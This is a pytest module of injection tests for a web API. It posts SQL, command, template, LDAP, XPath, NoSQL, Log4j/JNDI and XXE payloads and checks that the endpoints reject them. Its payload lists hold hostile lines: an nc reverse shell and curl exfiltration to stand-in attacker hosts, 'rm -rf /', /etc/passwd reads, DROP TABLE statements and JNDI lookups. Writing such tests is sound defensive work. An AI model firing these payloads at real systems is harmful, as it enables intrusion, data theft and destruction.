"""Injection attack security tests.

Tests protection against various injection attacks:
- SQL injection
- Command injection
- LDAP injection
- Template injection
- Expression language injection
"""

from httpx import AsyncClient
import pytest


class TestSQLInjection:
    """Test protection against SQL injection attacks."""

    @pytest.mark.asyncio()
    @pytest.mark.parametrize(
        "payload",
        [
            "' OR '1'='1",
            "1' OR '1' = '1",
            "admin'--",
            "' OR 1=1--",
            "1; DROP TABLE users--",
            "'; DROP TABLE users; --",
            "1' UNION SELECT NULL--",
            "admin' OR '1'='1'/*",
            "' UNION SELECT username, password FROM users--",
            "1' AND 1=(SELECT COUNT(*) FROM users)--",
        ],
    )
    async def test_sql_injection_in_login(self, client: AsyncClient, payload: str):
        """Test that SQL injection in login is prevented."""
        response = await client.post(
            "/api/v1/auth/token", data={"username": payload, "password": "password"}
        )
        assert response.status_code in [401, 422]
        assert "error" not in response.text.lower() or "syntax" not in response.text.lower()

    @pytest.mark.asyncio()
    @pytest.mark.parametrize(
        "payload",
        [
            "' OR '1'='1",
            "1' UNION SELECT * FROM users--",
            "'; DROP TABLE files; --",
        ],
    )
    async def test_sql_injection_in_search(
        self, client: AsyncClient, auth_headers: dict, payload: str
    ):
        """Test that SQL injection in search is prevented."""
        response = await client.post(
            "/api/v1/search", headers=auth_headers, json={"query": payload}
        )
        assert response.status_code in [200, 400, 422]

        if response.status_code == 200:
            assert "syntax error" not in response.text.lower()
            assert "sql" not in response.text.lower()

    @pytest.mark.asyncio()
    async def test_sql_injection_with_stacked_queries(
        self, client: AsyncClient, auth_headers: dict
    ):
        """Test that stacked SQL queries are prevented."""
        payload = "test'; DELETE FROM users WHERE '1'='1"
        response = await client.post(
            "/api/v1/search", headers=auth_headers, json={"query": payload}
        )
        assert response.status_code in [200, 400, 422]

    @pytest.mark.asyncio()
    async def test_sql_injection_with_time_based_blind(
        self, client: AsyncClient, auth_headers: dict
    ):
        """Test that time-based blind SQL injection is prevented."""
        import time

        payload = "test' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
        start_time = time.time()

        await client.post(
            "/api/v1/search", headers=auth_headers, json={"query": payload}
        )

        elapsed_time = time.time() - start_time
        assert elapsed_time < 3


class TestCommandInjection:
    """Test protection against OS command injection."""

    @pytest.mark.asyncio()
    @pytest.mark.parametrize(
        "payload",
        [
            "; ls -la",
            "| cat /etc/passwd",
            "&& whoami",
            "; rm -rf /",
            "$(cat /etc/passwd)",
            "`whoami`",
            "; nc -e /bin/sh attacker.com 4444",
            "| curl http://evil.com/$(whoami)",
        ],
    )
    async def test_command_injection_in_filename(
        self, client: AsyncClient, auth_headers: dict, payload: str
    ):
        """Test that command injection in filename is prevented."""
        response = await client.post(
            "/api/v1/files/",
            files={"file": (f"file{payload}.txt", b"content")},
            headers=auth_headers,
        )
        assert response.status_code in [400, 403, 404, 422]

    @pytest.mark.asyncio()
    @pytest.mark.parametrize(
        "payload",
        [
            "; cat /etc/passwd",
            "| whoami",
            "&& id",
            "$(id)",
        ],
    )
    async def test_command_injection_in_export_path(
        self, client: AsyncClient, auth_headers: dict, payload: str
    ):
        """Test that command injection in export path is prevented."""
        response = await client.post(
            "/api/v1/export/full",
            headers=auth_headers,
            json={"output_path": f"/tmp/export{payload}"},
        )
        assert response.status_code in [400, 403, 404, 422]


class TestTemplateInjection:
    """Test protection against template injection attacks."""

    @pytest.mark.asyncio()
    @pytest.mark.parametrize(
        "payload",
        [
            "{{7*7}}",
            "{{config}}",
            "{{request}}",
            "${7*7}",
            "#{7*7}",
            "<%= 7*7 %>",
            "{{''.__class__.__mro__[2].__subclasses__()}}",
        ],
    )
    async def test_template_injection_in_search(
        self, client: AsyncClient, auth_headers: dict, payload: str
    ):
        """Test that template injection in search is prevented."""
        response = await client.post(
            "/api/v1/search", headers=auth_headers, json={"query": payload}
        )
        assert response.status_code in [200, 400, 422]

        if response.status_code == 200:
            assert "49" not in response.text
            assert "config" not in response.text.lower()


class TestLDAPInjection:
    """Test protection against LDAP injection (if applicable)."""

    @pytest.mark.asyncio()
    @pytest.mark.parametrize(
        "payload",
        [
            "*",
            "admin*",
            "*(|(uid=*))",
            "admin)(|(password=*))",
            "*)(uid=*))(|(uid=*",
        ],
    )
    async def test_ldap_injection_in_username(self, client: AsyncClient, payload: str):
        """Test that LDAP injection in username is prevented."""
        response = await client.post(
            "/api/v1/auth/token", data={"username": payload, "password": "password"}
        )
        assert response.status_code in [401, 422]


class TestXPathInjection:
    """Test protection against XPath injection."""

    @pytest.mark.asyncio()
    @pytest.mark.parametrize(
        "payload",
        [
            "' or '1'='1",
            "' or 1=1 or ''='",
            "x' or name()='username' or 'x'='y",
        ],
    )
    async def test_xpath_injection(self, client: AsyncClient, auth_headers: dict, payload: str):
        """Test that XPath injection is prevented."""
        response = await client.post(
            "/api/v1/search", headers=auth_headers, json={"query": payload}
        )
        assert response.status_code in [200, 400, 422]


class TestJSONInjection:
    """Test protection against JSON injection attacks."""

    @pytest.mark.asyncio()
    async def test_json_injection_with_extra_fields(self, client: AsyncClient, auth_headers: dict):
        """Test that extra JSON fields don't cause injection."""
        response = await client.post(
            "/api/v1/search",
            headers=auth_headers,
            json={"query": "test", "is_admin": True, "user_id": 999, "__proto__": {"admin": True}},
        )
        assert response.status_code in [200, 400, 422]

    @pytest.mark.asyncio()
    async def test_json_injection_with_nested_objects(
        self, client: AsyncClient, auth_headers: dict
    ):
        """Test that deeply nested objects don't cause issues."""
        deeply_nested = {"level1": {"level2": {"level3": {"level4": {"level5": "deep"}}}}}

        response = await client.post(
            "/api/v1/search",
            headers=auth_headers,
            json={"query": "test", "metadata": deeply_nested},
        )
        assert response.status_code in [200, 400, 422]


class TestLog4jInjection:
    """Test protection against Log4j/JNDI injection (if applicable)."""

    @pytest.mark.asyncio()
    @pytest.mark.parametrize(
        "payload",
        [
            "${jndi:ldap://evil.com/a}",
            "${jndi:dns://evil.com}",
            "${jndi:rmi://evil.com/a}",
            "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://evil.com/a}",
        ],
    )
    async def test_jndi_injection_in_search(
        self, client: AsyncClient, auth_headers: dict, payload: str
    ):
        """Test that JNDI/Log4j injection is prevented."""
        response = await client.post(
            "/api/v1/search", headers=auth_headers, json={"query": payload}
        )
        assert response.status_code in [200, 400, 422]

        if response.status_code == 200:
            assert "jndi" not in response.text.lower()
            assert "ldap" not in response.text.lower()


class TestNoSQLInjection:
    """Test protection against NoSQL injection (if applicable)."""

    @pytest.mark.asyncio()
    async def test_nosql_injection_with_operators(self, client: AsyncClient, auth_headers: dict):
        """Test that NoSQL operators in queries are handled safely."""
        payload = {"$ne": None}

        response = await client.post(
            "/api/v1/search", headers=auth_headers, json={"query": payload}
        )
        assert response.status_code in [200, 400, 422]

    @pytest.mark.asyncio()
    async def test_nosql_injection_with_regex(self, client: AsyncClient, auth_headers: dict):
        """Test that NoSQL regex injection is prevented."""
        payload = {"$regex": ".*"}

        response = await client.post(
            "/api/v1/search", headers=auth_headers, json={"query": payload}
        )
        assert response.status_code in [200, 400, 422]


class TestXXEInjection:
    """Test protection against XML External Entity (XXE) injection."""

    @pytest.mark.asyncio()
    async def test_xxe_in_xml_upload(self, client: AsyncClient, auth_headers: dict):
        """Test that XXE in XML file is prevented."""
        xxe_payload = b"""<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>"""

        response = await client.post(
            "/api/v1/files/",
            files={"file": ("malicious.xml", xxe_payload, "application/xml")},
            headers=auth_headers,
        )
        assert response.status_code in [200, 201, 400, 403, 404, 415]
